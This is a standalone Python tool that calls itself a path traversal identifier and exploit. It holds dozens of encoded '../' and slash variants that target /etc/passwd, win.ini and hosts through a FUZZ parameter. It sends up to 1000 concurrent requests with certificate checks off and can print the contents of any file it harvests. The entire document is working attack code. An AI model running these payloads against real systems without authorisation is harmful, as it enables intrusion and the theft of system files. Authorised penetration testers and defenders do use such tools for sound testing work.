#!/usr/bin/env python3
#! -*- coding: utf-8 -*-

import argparse
import asyncio
import aiohttp
import yarl
import time
from functools import partial

from colorama import init, Fore, Back, Style
init()

WINDOWS_FILES = ['Windows|win.ini', 'Windows|System32|drivers|etc|hosts']
LINUX_FILES = ['etc|passwd', 'etc|issue']
DOTS = [
    '..',
    '.%00.',
    '..%00',
    '..%01',
    '.?', '??', '?.',
    '%5C..',
    '.%2e',
    '%2e.',
    '.../.',
    '..../',
    '%2e%2e',
    '%%c0%6e%c0%6e',
    '0x2e0x2e',
    '%c0.%c0.',
    '%252e%252e',  # double URL encoding: ..
    '%c0%2e%c0%2e',
    '%c0%ae%c0%ae',
    '%c0%5e%c0%5e',
    '%c0%ee%c0%ee',
    '%c0%fe%c0%fe',
    '%uff0e%uff0e',
    '%%32%%65%%32%%65',
    '%e0%80%ae%e0%80%ae',
    '%25c0%25ae%25c0%25ae',
    '%f0%80%80%ae%f0%80%80%ae',
    '%f8%80%80%80%ae%f8%80%80%80%ae',
    '%fc%80%80%80%80%ae%fc%80%80%80%80%ae']
SLASHES = [
    '/', '\\',
    '%2f', '%5c',
    '0x2f', '0x5c',
    '%252f',
    '%255c',  # double URL encoding: \
    '%c0%2f', '%c0%af', '%c0%5c', '%c1%9c', '%c1%pc',
    '%c0%9v', '%c0%qf', '%c1%8s', '%c1%1c', '%c1%af',
    '%bg%qf', '%u2215', '%u2216', '%uEFC8', '%uF025',
    '%%32%%66', '%%35%%63',
    '%e0%80%af',
    '%25c1%259c', '%25c0%25af',
    '%f0%80%80%af',
    '%f8%80%80%80%af']

argparse_list = partial(str.split, sep=',')


async def get_http(session, url, save):
    try:
        async with session.get(url, verify_ssl=False) as response:
            text = await response.read()
            if response.status == 200:
                if len(text) not in opts.fs:
                    print('{:<100}{:>20}'.format(str(url),
                                                 f' [Status: {Fore.GREEN}200{Style.RESET_ALL}, Size: {len(text)}]'))
                if opts.output_data:
                    save[url.path] = f'{Back.WHITE}{Fore.BLACK}{text.decode()}{Style.RESET_ALL}'
            elif response.status in (301, 403, 404):
                if len(text) not in opts.fs and opts.verbose:
                    print('{:<100}{:>20}'.format(str(url),
                                                 f' [Status: {Fore.YELLOW}{response.status}{Style.RESET_ALL}, Size: {len(text)}]'))
            elif response.status in (500,):
                if len(text) not in opts.fs and opts.verbose:
                    print('{:<100}{:>20}'.format(str(url),
                                                 f' [Status: {Fore.RED}{response.status}{Style.RESET_ALL}, Size: {len(text)}]'))
            else:
                if len(text) not in opts.fs and opts.verbose:
                    print('{:<100}{:>20}'.format(str(url), f' [Status: {response.status}, Size: {len(text)}]'))
    except asyncio.CancelledError:
        return
    except aiohttp.ClientConnectorError:
        raise
    except BaseException:
        return


async def post_http(url, save):
    pass


async def run_http(urls, save):
    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(
                limit=1000)) as session:  # speed up requests with increasing simultaneous TCP connections
            tasks = []
            for url in urls:
                url = yarl.URL(url, encoded=True)
                tasks.append(asyncio.create_task(get_http(session, url, save)))
            await asyncio.gather(*tasks)
    except aiohttp.ClientConnectorError:
        print(f'[{Fore.RED}-{Style.RESET_ALL}] Specified host is not available')
    except asyncio.CancelledError:
        print(f'[{Fore.CYAN}*{Style.RESET_ALL}] Closing event loop')
    finally:
        for task in tasks:
            task.cancel()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='path traversal identificator & exploit')
    parser.add_argument('-v', '--verbose', action='store_true', help='verbose output')
    # parser.add_argument('-M', '--module-detect', action='store_true', default=False, help='intelligent service detection')
    parser.add_argument('-o', '--os-type', required=True, choices=['windows', 'linux'])
    # parser.add_argument('-O', '--os-detect', action='store_true', default=False, help='intelligent OS detection')
    parser.add_argument('-d', '--depth', type=int, default=4, help='depth of PT searching')
    parser.add_argument('-f', '--filename', help='specific filename for PT detection')
    parser.add_argument('--output-data', action='store_true', help='output contents of harvested files')
    parser.add_argument('-fs', type=argparse_list, default=[], help='filter output by size')
    parser.add_argument('url', help='url for testing')

    opts = parser.parse_args()
    parsed_url = yarl.URL(opts.url)
    if opts.filename:
        WINDOWS_FILES = [opts.filename]
        LINUX_FILES = [opts.filename]
    if opts.fs:
        opts.fs = list(map(int, opts.fs))
    if opts.url.count('FUZZ') != 1:
        parser.error('You must specify FUZZ parameter in url by example scheme://host:port/path?parameter=FUZZ')

    max_url_size = len(opts.url) + len(max(WINDOWS_FILES if opts.os_type == 'windows' else LINUX_FILES)) + len(
        max(DOTS)) * opts.depth + len(max(SLASHES)) * opts.depth

    payloads = []
    if opts.os_type == 'windows':
        for file in WINDOWS_FILES:
            for slash in SLASHES:
                for dot in DOTS:
                    payloads += [opts.url.replace('FUZZ', (dot + slash) * i + file.replace('|', slash)) for i in
                                 range(1, opts.depth + 1)]
    else:
        for file in LINUX_FILES:
            for slash in SLASHES:
                for dot in DOTS:
                    payloads += [opts.url.replace('FUZZ', (dot + slash) * i + file.replace('|', slash)) for i in
                                 range(1, opts.depth + 1)]

    saves = {}
    loop = asyncio.new_event_loop()
    if yarl.URL(opts.url).scheme in ('http', 'https'):
        task = loop.create_task(run_http(payloads, saves))
    else:
        parser.error('Not implemented')

    try:
        start = time.time()
        print(f'[{Fore.CYAN}*{Style.RESET_ALL}] Started at {time.ctime(start)}')
        loop.run_until_complete(task)
    except KeyboardInterrupt:
        print(f'[{Fore.CYAN}*{Style.RESET_ALL}] Got keyboard interrupt')
        task.cancel()
        loop.run_until_complete(task)
    finally:
        loop.close()
        end = time.time()

        if opts.output_data:
            for k, v in saves.items():
                print(f'\t{k}\n{v}\n\n')
        print(f'[{Fore.CYAN}*{Style.RESET_ALL}] Ended at {time.ctime(end)} ({int(end - start)} seconds)')
